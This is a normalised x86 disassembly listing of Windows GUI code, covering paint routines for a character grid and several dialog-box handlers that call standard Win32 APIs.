push eax
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
add esp 0x64
retn 0x10
mov edx [ esp + 0x78 ]
lea ecx [ esp + 0x34 ]
push ecx
push edx
call [ BeginPaint@IAT ]
mov edi [ GetSysColor@IAT ]
mov esi eax
xor eax eax
mov ax [ ebp + 0x8 ]
push 0x8
and eax 0xff00
or eax 0x20
mov [ esp + 0x84 ] eax
call edi
push eax
push esi
call [ SetTextColor@IAT ]
push 0x5
call edi
push eax
push esi
call [ SetBkColor@IAT ]
mov edi [ SelectObject@IAT ]
mov [ esp + 0x84 ] 0x16
sub ecx 0x6c
jne r-xdata
cmp esi 0x7e
jg r-xdata
nop
mov ecx esi
or ecx edi
push ecx
mov ecx ebp
call sub_41c8e0
test eax eax
jne r-xdata
mov edi 0x2100
jmp r-xdata
mov edi 0x7400
jmp r-xdata
cmp esi 0x21
jge r-xdata
mov ecx esi
or ecx edi
push ecx
mov ecx ebp
call sub_41c8e0
test eax eax
jne r-xdata
sub edi 0x100
push edi
mov ecx ebp
call sub_41c910
test eax eax
jne r-xdata
cmp esi 0x7e
jle r-xdata
lea esp [ esp ]
add edi 0x100
push edi
mov ecx ebp
call sub_41c910
test eax eax
jne r-xdata
call [ SendMessageA@IAT ]
cmp esi 0x20
jl r-xdata
nop
lea eax [ ebx - 0x16 ]
mov [ esp + 0x14 ] eax
lea eax [ ebx - 0x13 ]
mov [ esp + 0x24 ] eax
add eax 0x10
mov [ esp + 0x2c ] eax
mov eax [ esp + 0x80 ]
push eax
mov ecx ebp
mov [ esp + 0x20 ] ebx
call sub_41c8e0
test eax eax
je r-xdata
mov eax [ ebp ]
push 0x0
push 0x4be
push 0x111
push eax
call [ SendMessageA@IAT ]
dec esi
cmp esi 0x20
jg r-xdata
inc esi
cmp esi 0x7e
jle r-xdata
xor edx edx
mov dl [ ebp + 0x8 ]
and edx 0xf
or edx 0x70
mov esi edx
sub esi 0x10
cmp esi 0x20
jg r-xdata
cmp edi 0x2100
jne r-xdata
xor ecx ecx
mov cl [ ebp + 0x8 ]
and ecx 0xf
or ecx 0x20
mov esi ecx
add esi 0x10
cmp esi 0x7f
jl r-xdata
cmp edi 0x7400
jne r-xdata
push 0x0
or esi edi
push esi
mov ecx ebp
call sub_41d870
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
add esp 0x64
retn 0x10
jmp r-xdata
push 0x2
call [ GetStockObject@IAT ]
push eax
lea ecx [ esp + 0x18 ]
push ecx
push esi
call [ FillRect@IAT ]
push 0x8
call [ GetSysColor@IAT ]
push eax
push 0x0
push 0x0
call [ CreatePen@IAT ]
push eax
push esi
call edi
push 0x5
mov ebp eax
call [ GetSysColorBrush@IAT ]
push eax
push esi
call edi
mov eax [ esp + 0x84 ]
push eax
push ebx
add eax 0xffffffea
push eax
lea eax [ ebx - 0x16 ]
push eax
push esi
call [ Rectangle@IAT ]
mov ecx [ esp + 0x10 ]
mov ecx [ ecx + 0x4 ]
mov edx [ ecx ]
lea eax [ esp + 0x24 ]
push eax
mov eax [ esp + 0x84 ]
push eax
push esi
call [ edx + 0x4 ]
push ebp
push esi
call edi
push eax
call [ DeleteObject@IAT ]
mov ebp [ esp + 0x10 ]
jmp r-xdata
mov eax esi
or eax edi
push eax
mov ecx ebp
call sub_41c8e0
test eax eax
jne r-xdata
jmp r-xdata
jmp r-xdata
mov eax esi
or eax edi
push eax
mov ecx ebp
call sub_41c8e0
test eax eax
jne r-xdata
jmp r-xdata
mov edx esi
or edx edi
push edx
mov ecx ebp
call sub_41c8e0
test eax eax
jne r-xdata
mov edx [ esp + 0x80 ]
inc edx
add ebx 0x16
cmp ebx 0x176
mov [ esp + 0x80 ] edx
jl r-xdata
lea eax [ esp + 0x14 ]
push eax
push esi
call [ InvertRect@IAT ]
movzx edx [ ebp + 0x8 ]
cmp [ esp + 0x80 ] edx
jne r-xdata
dec esi
cmp esi 0x20
jge r-xdata
mov eax [ esp + 0x84 ]
add eax 0x16
cmp eax 0x9a
mov [ esp + 0x84 ] eax
jl r-xdata
mov eax [ esp + 0x84 ]
lea ecx [ eax - 0x16 ]
mov [ esp + 0x20 ] eax
add eax 0xffffffed
mov [ esp + 0x28 ] eax
add eax 0x10
mov [ esp + 0x18 ] ecx
mov [ esp + 0x30 ] eax
mov ebx 0x16
jmp r-xdata
mov edx [ esp + 0x78 ]
lea ecx [ esp + 0x34 ]
push ecx
push edx
call [ EndPaint@IAT ]
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
add esp 0x64
retn 0x10
sub_41e070
mov eax [ esp + 0x8 ]
sub esp 0x64
cmp eax 0x100
push ebx
push ebp
push esi
push edi
mov edi ecx
ja r-xdata
cmp eax 0x203
ja r-xdata
je r-xdata
cmp eax 0x20a
je r-xdata
je r-xdata
push 0x11
call [ GetKeyState@IAT ]
xor ecx ecx
test ax ax
setl cl
xor ebx ebx
mov eax ecx
mov ecx [ esp + 0x80 ]
test eax eax
setne bl
add ecx 0xffffffdf
cmp ecx 0x35
lea ebx [ ebx * 4 + 0x1 ]
ja r-xdata
lea ecx [ eax - 0x1 ]
cmp ecx 0x86
ja r-xdata
push 0x0
lea ecx [ esp + 0x24 ]
push ecx
push 0x0
push 0x68
call [ SystemParametersInfoA@IAT ]
mov ecx [ rw-data ]
mov esi eax
mov eax [ esp + 0x80 ]
movzx edx ax
shr eax 0x10
movsx eax ax
add ecx eax
test dl 0x4
mov [ esp + 0x20 ] edx
mov [ rw-data ] ecx
jne r-xdata
mov ecx [ esp + 0x84 ]
mov edx [ esp + 0x80 ]
push ecx
push edx
push eax
mov eax [ esp + 0x84 ]
push eax
call [ DefWindowProcA@IAT ]
pop edi
pop esi
pop ebp
pop ebx
add esp 0x64
retn 0x10
mov eax [ edi + 0x40 ]
push 0x0
push 0x1
push 0x111
push eax
call [ SendMessageA@IAT ]
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
add esp 0x64
retn 0x10
cmp eax 0x102
je r-xdata
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
add esp 0x64
retn 0x10
movzx edx [ ecx + lookup_table_41e9b4 ]
jmp [ edx * 4 + jump_table_41e98c ]
movzx ecx [ ecx + lookup_table_41e904 ]
jmp [ ecx * 4 + jump_table_41e8ec ]
cmp ecx 0x78
jle r-xdata
cmp esi 0xffffffff
je r-xdata
mov eax [ esp + 0x80 ]
cmp eax 0x20
jne r-xdata
cmp eax 0x201
jne r-xdata
add [ edi + 0x14c ] bx
jmp r-xdata
sub [ edi + 0x14c ] bx
jmp r-xdata
xor ecx ecx
mov cx [ edi + 0x14e ]
xor esi esi
mov si [ edi + 0x14c ]
movsx ebp cx
movsx eax si
imul ecx ebx
cdq
idiv ebp
mov eax esi
sub eax ecx
jmp r-xdata
mov ax [ edi + 0x14e ]
imul ax bx
add [ edi + 0x14c ] ax
jmp r-xdata
test eax eax
je r-xdata
test eax eax
je r-xdata
mov si [ edi + 0x14c ]
mov cx [ edi + 0x14e ]
movsx eax si
movsx ebx cx
cdq
idiv ebx
xor ebx ebx
mov bx [ edi + 0x152 ]
imul bx cx
mov eax esi
sub eax ebx
mov cx [ edi + 0x152 ]
imul cx [ edi + 0x14e ]
add [ edi + 0x14c ] cx
cmp [ edi + 0x158 ] 0x0
jne r-xdata
mov esi [ esp + 0x84 ]
xor ebp ebp
mov [ edi + 0x154 ] bp
mov [ edi + 0x156 ] bp
mov ecx [ esi + 0x14 ]
mov eax 0x2e8ba2e9
imul ecx
sar edx 0x2
mov eax edx
shr eax 0x1f
add edx eax
mov [ edi + 0x14e ] dx
movsx ecx dx
mov eax 0x102
cdq
idiv ecx
movsx ebx [ edi + 0x14e ]
mov ecx eax
mov eax 0x102
cdq
idiv ebx
mov [ edi + 0x150 ] cx
test edx edx
je r-xdata
pop edi
pop esi
pop ebp
mov eax 0x81
pop ebx
add esp 0x64
retn 0x10
call [ DestroyCaret@IAT ]
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
add esp 0x64
retn 0x10
mov ecx [ esp + 0x78 ]
lea eax [ esp + 0x34 ]
push eax
push ecx
call [ BeginPaint@IAT ]
mov esi eax
push esi
call [ CreateCompatibleDC@IAT ]
push 0xffff
mov [ esp + 0x88 ] eax
call [ CreateSolidBrush@IAT ]
mov [ esp + 0x80 ] eax
xor eax eax
cmp [ edi + 0x150 ] ax
mov [ esp + 0x14 ] eax
mov [ esp + 0x10 ] eax
mov [ esp + 0x7c ] eax
jle r-xdata
mov edx [ esp + 0x78 ]
push edx
mov ecx edi
call sub_41cba0
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
add esp 0x64
retn 0x10
mov eax ecx
cdq
xor eax edx
sub eax edx
cmp eax 0x78
jle r-xdata
lea edx [ ecx - 0x79 ]
mov eax 0x88888889
mul edx
mov bx [ edi + 0x152 ]
mov bp [ edi + 0x14e ]
mov si [ edi + 0x14c ]
shr edx 0x6
inc edx
mov eax edx
imul eax eax 0xffffff88
add ecx eax
mov [ rw-data ] ecx
lea ebx [ ebx ]
cmp ecx 0x78
jle r-xdata
add eax 0xffffffd0
test eax eax
jl r-xdata
mov ecx edi
call sub_41cdc0
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
add esp 0x64
retn 0x10
mov esi [ esp + 0x84 ]
mov ecx esi
shr ecx 0x10
mov eax 0x2e8ba2e9
imul ecx
sar edx 0x2
mov ecx edx
shr ecx 0x1f
add edx ecx
mov ebx edx
add bx [ edi + 0x154 ]
movzx ecx si
imul bx [ edi + 0x14e ]
mov eax 0x2e8ba2e9
imul ecx
sar edx 0x2
mov eax edx
shr eax 0x1f
add edx eax
add ebx edx
mov ecx edi
mov [ edi + 0x14c ] bx
call sub_41cdc0
mov esi [ esp + 0x78 ]
push esi
call [ SetFocus@IAT ]
push esi
mov ecx edi
call sub_41cba0
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
add esp 0x64
retn 0x10
cmp [ edi + 0x14c ] 0x0
jge r-xdata
test ax ax
mov [ edi + 0x14c ] ax
jge r-xdata
movsx eax [ edi + 0x14c ]
xor ecx ecx
mov cx [ edi + 0x14e ]
movsx esi cx
cdq
idiv esi
imul eax ecx
mov [ edi + 0x14c ] ax
jmp r-xdata
mov [ edi + 0x14c ] 0x0
movsx eax [ edi + 0x14c ]
xor ecx ecx
mov cx [ edi + 0x14e ]
cdq
movsx esi cx
idiv esi
inc eax
imul eax ecx
dec eax
mov [ edi + 0x14c ] ax
jmp r-xdata
mov [ edi + 0x14c ] 0x102
mov [ edi + 0x14c ] dx
jmp r-xdata
cmp [ edi + 0x14c ] 0x102
jl r-xdata
mov [ edi + 0x14c ] 0x0
mov eax [ edi + 0x40 ]
push 0x0
push 0x4a9
push 0x111
push eax
call [ SendMessageA@IAT ]
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
add esp 0x64
retn 0x10
mov dx [ edi + 0x150 ]
mov ebx [ GetSystemMetrics@IAT ]
push 0x1
push 0x2e
mov [ edi + 0x152 ] dx
call ebx
movsx ecx [ edi + 0x152 ]
imul ecx ecx 0xb
add eax ecx
shl eax 0x1
push eax
push 0x2d
call ebx
movsx edx [ edi + 0x14e ]
mov ecx [ esi + 0x1c ]
imul edx edx 0xb
add eax edx
shl eax 0x1
push eax
mov eax [ esi + 0x18 ]
mov esi [ esp + 0x84 ]
push eax
push ecx
push esi
call [ MoveWindow@IAT ]
push ebp
push esi
call ImmAssociateContext
movsx eax [ edi + 0x152 ]
cdq
xor ecx ecx
mov cx [ edi + 0x14e ]
sub eax edx
mov ebx eax
sar ebx 0x1
movsx eax cx
imul ebx ecx
cdq
sub eax edx
sar eax 0x1
add ebx eax
push esi
mov ecx edi
mov [ edi + 0x14c ] bx
call sub_41cba0
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
add esp 0x64
retn 0x10
inc ecx
mov [ edi + 0x150 ] cx
mov edx [ esp + 0x80 ]
push edx
call [ DeleteObject@IAT ]
mov eax [ esp + 0x84 ]
push eax
call [ DeleteDC@IAT ]
mov edx [ esp + 0x78 ]
lea ecx [ esp + 0x34 ]
push ecx
push edx
call [ EndPaint@IAT ]
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
add esp 0x64
retn 0x10
movsx edx [ edi + 0x154 ]
mov ebp [ esp + 0x14 ]
sub ebp edx
imul ebp ebp 0x16
cmp [ edi + 0x14e ] 0x0
mov [ esp + 0x1c ] 0x0
jle r-xdata
cmp [ edi + 0x14c ] 0x0
jge r-xdata
xor ebx ebx
mov bx [ edi + 0x152 ]
xor ebp ebp
mov bp [ edi + 0x14e ]
xor esi esi
mov si [ edi + 0x14c ]
mov eax ebx
imul eax ebp
add esi eax
dec edx
jne r-xdata
mov [ edi + 0x14c ] si
mov eax ecx
cdq
xor eax edx
sub eax edx
cmp eax 0x78
jle r-xdata
lea edx [ ecx - 0x79 ]
mov eax 0x88888889
mul edx
mov bp [ edi + 0x14e ]
mov bx [ edi + 0x14c ]
shr edx 0x6
inc edx
mov eax edx
imul eax eax 0xffffff88
add ecx eax
mov [ rw-data ] ecx
lea esp [ esp ]
cmp eax 0x9
jg r-xdata
mov edx [ esp + 0x78 ]
push edx
mov ecx edi
call sub_41cba0
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
add esp 0x64
retn 0x10
mov [ edi + 0x14c ] 0x101
mov eax [ esp + 0x14 ]
movsx ecx [ edi + 0x150 ]
inc eax
cmp eax ecx
mov [ esp + 0x14 ] eax
jl r-xdata
mov ecx [ esp + 0x10 ]
mov ebx 0x16
cmp [ edi + 0x14c ] 0x102
jl r-xdata
mov [ edi + 0x14c ] 0x0
mov edx ebx
imul edx ebp
add ecx 0x78
sub esi edx
mov eax ecx
cdq
xor eax edx
sub eax edx
cmp eax 0x78
jg r-xdata
mov [ edi + 0x14c ] si
xor ebp ebp
mov bp [ edi + 0x14e ]
xor ebx ebx
mov bx [ edi + 0x14c ]
mov eax ebp
imul eax esi
add ebx eax
dec edx
jne r-xdata
mov [ edi + 0x14c ] bx
movsx ecx [ edi + 0x156 ]
lea ecx [ ecx + ecx * 4 ]
lea ecx [ eax + ecx * 2 ]
cmp ecx 0x11
jle r-xdata
lea edx [ ebx - 0x16 ]
lea eax [ ebp + 0x16 ]
push 0x2
mov [ esp + 0x28 ] edx
mov [ esp + 0x2c ] ebp
mov [ esp + 0x30 ] ebx
mov [ esp + 0x34 ] eax
call [ GetStockObject@IAT ]
push eax
lea eax [ esp + 0x28 ]
push eax
push esi
call [ FillRect@IAT ]
mov al [ ecx + rw-data ]
test al al
jne r-xdata
mov eax [ esp + 0x78 ]
push eax
mov ecx edi
call sub_41cba0
mov [ edi + 0x14c ] 0x101
mov edx ebp
imul edx esi
add ecx 0x78
sub ebx edx
mov eax ecx
cdq
xor eax edx
sub eax edx
cmp eax 0x78
jg r-xdata
mov [ edi + 0x14c ] bx
jmp r-xdata
mov [ edi + 0x156 ] ax
xor eax eax
test ecx ecx
je r-xdata
mov ecx eax
cmp ecx 0x102
jge r-xdata
movzx eax al
mov cl [ eax + edi + 0x4c ]
test cl cl
mov [ esp + 0x18 ] eax
je r-xdata
push 0x0
call [ GetStockObject@IAT ]
push eax
push esi
call [ SelectObject@IAT ]
lea eax [ ebp + 0x16 ]
push eax
push ebx
push ebp
lea eax [ ebx - 0x16 ]
push eax
push esi
call [ Rectangle@IAT ]
push 0xff
push esi
call [ SetTextColor@IAT ]
mov ecx [ edi + 0x148 ]
mov edx [ esp + 0x84 ]
push ecx
push edx
call [ SelectObject@IAT ]
mov eax [ esp + 0x7c ]
mov ecx [ esp + 0x84 ]
push 0x8800c6
shl eax 0x4
push eax
push 0x0
push ecx
push 0x10
push 0x10
lea edx [ ebp + 0x3 ]
push edx
lea eax [ ebx - 0x13 ]
push eax
push esi
call [ BitBlt@IAT ]
inc [ esp + 0x7c ]
jmp r-xdata
mov [ rw-data ] ecx
mov [ edi + 0x14c ] ax
mov dl [ eax + rw-data ]
test dl dl
jne r-xdata
push 0x1
call [ GetStockObject@IAT ]
push eax
push esi
call [ SelectObject@IAT ]
mov ecx [ esp + 0x80 ]
push ecx
push esi
call [ SelectObject@IAT ]
mov [ esp + 0x80 ] eax
jmp r-xdata
mov ecx [ esp + 0x10 ]
mov eax [ esp + 0x1c ]
movsx edx [ edi + 0x14e ]
inc ecx
inc eax
add ebx 0x16
cmp eax edx
mov [ esp + 0x10 ] ecx
mov [ esp + 0x1c ] eax
jl r-xdata
inc eax
test ecx ecx
jne r-xdata
dec ecx
mov ecx [ esp + 0x80 ]
push ecx
push esi
call [ SelectObject@IAT ]
mov [ esp + 0x80 ] eax
jmp r-xdata
lea eax [ ebp + 0x16 ]
push eax
push ebx
push ebp
lea edx [ ebx - 0x16 ]
push edx
push esi
call [ Rectangle@IAT ]
push 0x0
push esi
call [ SetTextColor@IAT ]
mov eax [ edi + 0x144 ]
mov ecx [ esp + 0x84 ]
push eax
push ecx
call [ SelectObject@IAT ]
mov edx [ esp + 0x18 ]
mov eax [ esp + 0x84 ]
push 0x8800c6
shl edx 0x4
sub edx 0x10
push edx
push 0x0
push eax
push 0x10
push 0x10
lea ecx [ ebp + 0x3 ]
push ecx
lea edx [ ebx - 0x13 ]
push edx
push esi
call [ BitBlt@IAT ]
mov eax [ esp + 0x18 ]
mov cl [ eax + edi + 0x4c ]
test cl cl
je r-xdata
sub_41e9be
or [ ecx ] ecx
or [ ecx ] cl
or [ ecx ] ecx
or [ ecx ] ecx
or [ ecx ] ecx
or [ ecx ] ecx
or [ ecx ] ecx
or [ ecx ] ecx
or [ ecx ] ecx
or [ ecx ] ecx
or [ ecx ] ecx
or [ ecx ] ecx
or [ ecx ] ecx
or [ ecx ] ecx
or [ ecx ] ecx
or [ ecx ] ecx
or [ ecx ] ecx
or [ ecx ] ecx
or [ ecx ] ecx
or [ ecx ] ecx
or [ ecx ] ecx
or [ eax ] ecx
nop
nop
nop
nop
nop
nop
push esi
mov esi [ esp + 0x8 ]
push edi
mov edi [ esp + 0x10 ]
cmp edi 0x1
jne r-xdata
push 0x0
push esi
call [ GetWindowLongA@IAT ]
mov ecx [ esp + 0x18 ]
mov edx [ esp + 0x14 ]
push ecx
push edx
push edi
push esi
mov ecx eax
call sub_41ce50
pop edi
pop esi
retn 0x10
mov eax [ rw-data ]
push eax
push 0x0
push esi
call [ SetWindowLongA@IAT ]
sub_41ea30
mov eax [ esp + 0x8 ]
cmp eax 0x53
push ebx
push esi
push edi
mov ebx ecx
ja r-xdata
sub eax 0x110
je r-xdata
je r-xdata
movzx eax [ rw-data ]
mov esi [ esp + 0x10 ]
mov edi [ CheckDlgButton@IAT ]
push eax
push 0x618
push esi
call edi
movzx ecx [ rw-data ]
push ecx
push 0x619
push esi
call edi
push 0x49c
push 0x1
push esi
mov ecx ebx
call sub_41a330
dec eax
jne r-xdata
mov ecx [ esp + 0x10 ]
push 0x60e
push ecx
call sub_414bc0
add esp 0x8
pop edi
pop esi
mov eax 0x1
pop ebx
retn 0x10
sub eax 0x2
je r-xdata
pop edi
pop esi
xor eax eax
pop ebx
retn 0x10
mov edi [ esp + 0x18 ]
movzx eax di
sub eax 0x618
je r-xdata
mov esi [ esp + 0x10 ]
mov edi [ IsDlgButtonChecked@IAT ]
push 0x618
push esi
call edi
push 0x619
push esi
mov [ rw-data ] al
call edi
push esi
mov [ rw-data ] al
call sub_4258e0
add esp 0x4
test ebx ebx
je r-xdata
sub eax 0x4c
jne r-xdata
mov esi [ esp + 0x10 ]
push 0x618
push esi
call [ IsDlgButtonChecked@IAT ]
test eax eax
jne r-xdata
dec eax
je r-xdata
pop edi
pop esi
mov [ rw-data ] 0x0
mov eax 0x1
pop ebx
retn 0x10
mov ecx ebx
call j_sub_41a9d0
push ebx
call j_sub_429931
add esp 0x4
cmp [ esp + 0x18 ] 0x61b
jne r-xdata
push edi
mov ecx ebx
call sub_41c9b0
pop edi
pop esi
pop ebx
retn 0x10
push 0x1
push 0x619
push esi
call [ CheckDlgButton@IAT ]
mov esi [ esp + 0x10 ]
push 0x619
push esi
call [ IsDlgButtonChecked@IAT ]
test eax eax
jne r-xdata
dec eax
jne r-xdata
mov eax [ esp + 0x1c ]
push 0x61a
push eax
call sub_41a890
pop edi
pop esi
xor eax eax
pop ebx
retn 0x10
push 0x1
push 0x618
push esi
call [ CheckDlgButton@IAT ]
push edi
mov ecx ebx
call sub_41c9b0
pop edi
pop esi
pop ebx
retn 0x10
mov edx edi
shr edx 0x10
cmp edx 0x300
je r-xdata
pop edi
pop esi
mov eax 0x1
pop ebx
retn 0x10
sub_41ebd0
push ebx
push ebp
mov ebp [ esp + 0x14 ]
push esi
mov esi [ esp + 0x14 ]
cmp esi 0x53
push edi
mov edi [ esp + 0x14 ]
mov ebx ecx
ja r-xdata
mov eax esi
sub eax 0x110
je r-xdata
je r-xdata
mov esi [ esp + 0x14 ]
push 0x11
push 0x0
push 0x465
push 0x655
push esi
call [ SendDlgItemMessageA@IAT ]
mov al [ rw-data ]
mov edi [ CheckDlgButton@IAT ]
xor edx edx
test al al
sete dl
push edx
push 0x65c
push esi
call edi
movzx eax [ rw-data ]
push eax
push 0x618
push esi
call edi
movzx ecx [ rw-data ]
push ecx
push 0x619
push esi
call edi
push 0x654
push 0x1
push esi
mov ecx ebx
call sub_41a330
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
retn 0x10
dec eax
jne r-xdata
mov eax [ esp + 0x14 ]
push 0x60d
push eax
call sub_414bc0
add esp 0x8
pop edi
pop esi
pop ebp
mov eax 0x1
pop ebx
retn 0x10
mov eax esi
sub eax 0x2
je r-xdata
mov ecx [ esp + 0x20 ]
push ecx
push ebp
push esi
push edi
mov ecx ebx
call sub_41d4c0
pop edi
pop esi
pop ebp
pop ebx
retn 0x10
movzx eax bp
sub eax 0x618
je r-xdata
mov esi [ esp + 0x14 ]
mov edi [ IsDlgButtonChecked@IAT ]
push 0x618
push esi
call edi
push 0x619
push esi
mov [ rw-data ] al
call edi
push esi
mov [ rw-data ] al
call sub_4258e0
add esp 0x4
test ebx ebx
je r-xdata
sub eax 0x4c
jne r-xdata
push 0x618
push edi
call [ IsDlgButtonChecked@IAT ]
test eax eax
jne r-xdata
dec eax
jne r-xdata
pop edi
pop esi
pop ebp
mov [ rw-data ] 0x0
mov eax 0x1
pop ebx
retn 0x10
mov ecx ebx
call j_sub_41aa60
push ebx
call j_sub_429931
add esp 0x4
cmp ebp 0x659
jne r-xdata
push 0x1
push 0x619
push 0x619
push edi
call [ IsDlgButtonChecked@IAT ]
test eax eax
jne r-xdata
push 0x0
push 0x0
push 0x658
mov ebx edi
mov edi [ GetDlgItemInt@IAT ]
push ebx
call edi
push 0x0
push 0x0
push 0x654
push ebx
mov esi eax
call edi
mov edi eax
mov eax [ esp + 0x20 ]
mov ecx [ eax + 0x10 ]
sub esi ecx
jns r-xdata
push 0x1
push 0x618
jmp r-xdata
cmp esi 0x1e
jle r-xdata
mov esi 0x1e
jmp r-xdata
push edi
call [ CheckDlgButton@IAT ]
test esi esi
je r-xdata
xor esi esi
jmp r-xdata
cmp esi edi
jge r-xdata
push 0x0
push esi
push 0x658
push ebx
call [ SetDlgItemInt@IAT ]
pop edi
pop esi
pop ebp
mov eax 0x1
pop ebx
retn 0x10
xor edx edx
test ecx ecx
setge dl
dec edx
and edx edi
mov esi edx
sub_41edd0
mov eax [ esp + 0x8 ]
cmp eax 0x110
push ebp
push esi
mov ebp ecx
ja r-xdata
cmp eax 0x111
je r-xdata
je r-xdata
mov esi [ esp + 0x14 ]
movzx eax si
lea ecx [ eax - 0x604 ]
cmp ecx 0xa
ja r-xdata
pop esi
xor eax eax
pop ebp
retn 0x10
push ebx
mov ebx [ SendDlgItemMessageA@IAT ]
push edi
mov edi [ esp + 0x14 ]
mov esi 0x605
sub eax 0x2
je r-xdata
push esi
mov ecx ebp
call sub_41c9b0
pop esi
pop ebp
retn 0x10
movzx edx [ ecx + lookup_table_41ef30 ]
jmp [ edx * 4 + jump_table_41ef24 ]
push 0xa
push 0x0
push 0x465
push esi
push edi
call ebx
add esi 0x2
cmp esi 0x60d
jle r-xdata
push 0x604
push 0x1
push edi
mov ecx ebp
call sub_41a330
pop edi
pop ebx
pop esi
xor eax eax
pop ebp
retn 0x10
mov ecx [ esp + 0xc ]
push ecx
call sub_4258e0
add esp 0x4
test ebp ebp
je r-xdata
sub eax 0x51
jne r-xdata
mov eax [ esp + 0x18 ]
mov ecx [ ebp + 0x4c ]
push eax
push ecx
mov ecx ebp
call sub_41b350
mov ecx [ ebp + 0x4c ]
add ecx 0x2
mov eax ecx
cmp eax 0x60c
mov [ ebp + 0x4c ] ecx
jle r-xdata
mov ecx esi
shr ecx 0x10
cmp ecx 0x300
mov [ ebp + 0x4c ] eax
je r-xdata
pop esi
mov [ rw-data ] 0x0
mov eax 0x1
pop ebp
retn 0x10
mov ecx ebp
call j_sub_4198b0
push ebp
call j_sub_429931
add esp 0x4
mov eax [ esp + 0xc ]
push 0x60f
push eax
call sub_414bc0
add esp 0x8
pop esi
mov eax 0x1
pop ebp
retn 0x10
mov edx [ ebp + 0x4c ]
mov eax [ esp + 0xc ]
push edx
push eax
call [ GetDlgItem@IAT ]
push eax
call [ SetFocus@IAT ]
mov [ ebp + 0x4c ] 0x604
push eax
mov ecx ebp
call sub_41d690
pop esi
mov eax 0x1
pop ebp
retn 0x10
sub_41ef40
push ebx
mov ebx ecx
mov ecx [ esp + 0xc ]
mov eax ecx
sub eax 0x2
je r-xdata
mov eax [ esp + 0x8 ]
push eax
call sub_4258e0
add esp 0x4
test ebx ebx
je r-xdata
sub eax 0x51
je r-xdata
mov [ rw-data ] 0x0
mov eax 0x1
pop ebx
retn 0x10
mov ecx ebx
call j_sub_41aa60
push ebx
call j_sub_429931
add esp 0x4
mov edx [ esp + 0x8 ]
push 0x610
push edx
call sub_414bc0
add esp 0x8
mov eax 0x1
pop ebx
retn 0x10
sub eax 0xbd
je r-xdata
push esi
mov esi [ esp + 0xc ]
push edi
mov edi [ SendDlgItemMessageA@IAT ]
push 0xb
push 0x0
push 0x465
push 0x655
push esi
call edi
push 0x1a
push 0x0
push 0x465
push 0x659
push esi
call edi
push 0x2f
push 0x0
push 0x465
push 0x65b
push esi
call edi
mov al [ rw-data ]
xor ecx ecx
test al al
sete cl
push ecx
push 0x65c
push esi
call [ CheckDlgButton@IAT ]
push 0x654
push 0x1
push esi
mov ecx ebx
call sub_41a330
pop edi
pop esi
xor eax eax
pop ebx
retn 0x10
mov eax [ esp + 0x14 ]
mov edx [ esp + 0x10 ]
push eax
mov eax [ esp + 0xc ]
push edx
push ecx
push eax
mov ecx ebx
call sub_41d4c0
pop ebx
retn 0x10
sub_41f040
sub esp 0x26c
mov eax [ esp + 0x274 ]
cmp eax 0x110
push esi
mov esi ecx
push edi
mov [ esp + 0x8 ] esi
ja r-xdata
cmp eax 0x111
je r-xdata
je r-xdata
mov edi [ esp + 0x280 ]
movzx eax di
cmp eax 0x62c
jg r-xdata
pop edi
xor eax eax
pop esi
add esp 0x26c
retn 0x10
mov edx [ esi + 0x40 ]
push edx
lea ecx [ esp + 0x10 ]
mov [ esp + 0x270 ] 0xffffffff
call sub_415ea0
mov al [ rw-data ]
test al 0x10
je r-xdata
sub eax 0x2
je r-xdata
cmp eax 0x62d
jl r-xdata
je r-xdata
movsx edi al
and edi 0x8
or edi 0x10
shr edi 0x2
mov edi 0x15
jmp r-xdata
mov ecx [ esp + 0x278 ]
push ecx
call sub_4258e0
add esp 0x4
test esi esi
je r-xdata
sub eax 0x51
jne r-xdata
push edi
mov ecx esi
call sub_41c9b0
pop edi
pop esi
add esp 0x26c
retn 0x10
cmp eax 0x62e
jg r-xdata
mov eax [ esi ]
mov ecx esi
call [ eax + 0x4 ]
push edi
mov ecx esi
call sub_41c9b0
pop edi
pop esi
add esp 0x26c
retn 0x10
sub eax 0x2
jne r-xdata
movzx ecx [ rw-data ]
push 0x0
push ecx
push 0x14e
push 0x62c
push ebx
call ebp
cmp eax 0xffffffff
jne r-xdata
lea esp [ esp ]
push ebx
mov ebx [ esp + 0x27c ]
xor esi esi
test edi edi
push ebp
mov ebp [ SendDlgItemMessageA@IAT ]
jle r-xdata
pop edi
mov [ rw-data ] 0x0
mov eax 0x1
pop esi
add esp 0x26c
retn 0x10
mov ecx esi
call j_sub_4198b0
push esi
call j_sub_429931
add esp 0x4
mov eax [ esp + 0x278 ]
push 0x611
push eax
call sub_414bc0
add esp 0x8
mov ecx edi
shr ecx 0x10
cmp ecx 0x300
jne r-xdata
mov edx [ esp + 0x278 ]
push 0x0
push 0x0
push 0x147
push 0x62c
push edx
call [ SendDlgItemMessageA@IAT ]
push edi
mov ecx esi
mov [ rw-data ] al
call sub_41c9b0
pop edi
pop esi
add esp 0x26c
retn 0x10
mov ecx [ esp + 0x10 ]
push 0x62d
push 0x0
push ebx
call sub_41a330
pop ebp
pop ebx
pop edi
xor eax eax
pop esi
add esp 0x26c
retn 0x10
push 0x0
push 0x0
push 0x14e
push 0x62c
push ebx
call ebp
mov eax [ esi * 4 + rw-data ]
push eax
call sub_420ca0
add esp 0x4
push eax
push 0x0
push 0x143
push 0x62c
push ebx
call ebp
inc esi
cmp esi edi
jl r-xdata
pop edi
mov eax 0x1
pop esi
add esp 0x26c
retn 0x10
sub_41f240
mov eax 0x1770
call sub_42a0c0
mov eax [ esp + 0x1778 ]
cmp eax 0x53
push ebx
push ebp
push esi
push edi
mov esi ecx
ja r-xdata
sub eax 0x110
je r-xdata
je r-xdata
mov ecx [ esp + 0x1784 ]
push 0x49c
push 0x1
push ecx
mov ecx esi
call sub_41a330
dec eax
jne r-xdata
mov edx [ esp + 0x1784 ]
push 0x613
push edx
call sub_414bc0
add esp 0x8
pop edi
pop esi
pop ebp
